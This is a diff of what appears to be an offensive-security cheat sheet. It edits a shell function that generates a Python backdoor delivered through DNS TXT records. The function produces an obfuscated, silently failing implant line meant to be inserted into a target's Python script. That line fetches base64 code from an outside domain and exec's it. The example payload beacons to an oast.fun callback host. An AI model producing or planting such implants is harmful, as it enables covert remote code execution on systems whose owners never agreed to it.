@@ -1970,22 +1970,22 @@ pydnsbackdoorgen() {
     echo -e "This is the TXT record for ${1:?}\e[0;33m"
     base64 -w0 <"${2:?}"
     str="$(echo -en 'import dns.resolver\nexec(base64.b64decode("".join([d.to_text() for d in dns.resolver.resolve("'"${1:?}"'", "TXT").rrset])))' | base64 -w 0)"
-    echo -e "\e[0m\nThis is your implant string (add this to the target's python script):\e[0;32m"
+    echo -e "\e[0m\nAdd this implant string to a target's python script:\e[0;32m"
     echo "exec('"'try:\n\timport base64\n\texec(base64.b64decode("'"${str}"'"))\nexcept:\n\tpass'"')"
     echo -e "\e[0m"
 }
 ```
 
 Generate your payload:
-```
+```shell
 cat >egg.py<<-'EOF'
 import time
-dns.resolver.resolve(f"{int(time.time())}.vgnigskswpbmnhbkyoalc9ufgwru330sj.oast.fun")
+dns.resolver.resolve(f"{int(time.time())}.yzlespkpfkqfrtwgvhngkyqbuod49rgmo.oast.fun")
 EOF
 ```
 
 Generate your implant:
-```
+```shell
 pydnsbackdoorgen b00mpy.team-teso.net egg.py
 ```
    
